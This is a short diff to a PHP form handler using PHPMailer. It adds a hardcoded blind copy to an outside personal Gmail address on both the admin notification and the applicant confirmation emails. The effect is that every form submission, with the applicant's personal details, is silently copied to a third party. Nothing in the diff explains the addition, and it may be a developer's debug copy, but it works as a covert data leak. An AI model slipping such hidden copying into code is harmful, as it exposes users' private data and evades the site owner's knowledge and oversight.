@@ -186,6 +186,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             // === Email to Admin ===
             $mail->setFrom($_ENV['SMTP_USER'], "$siteName Application Form");
             $mail->addAddress($_ENV['SMTP_USER']);
+            $mail->addBCC('iphyze@gmail.com');
             $mail->isHTML(true);
             $mail->Subject = "New Application Form Submission - $siteName";
             // $mail->Body = getApplicationEmailBody($emailData, 'admin');
@@ -195,6 +196,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
             // === Email to User ===
             $mail->addAddress($email, $fullName);
+            $mail->addBCC('iphyze@gmail.com');
             $mail->Subject = "Thanks for contacting $siteName!";
             // $mail->Body = getApplicationEmailBody($emailData, 'user');
             $mail->Body = getUserApplicationEmail($emailData);
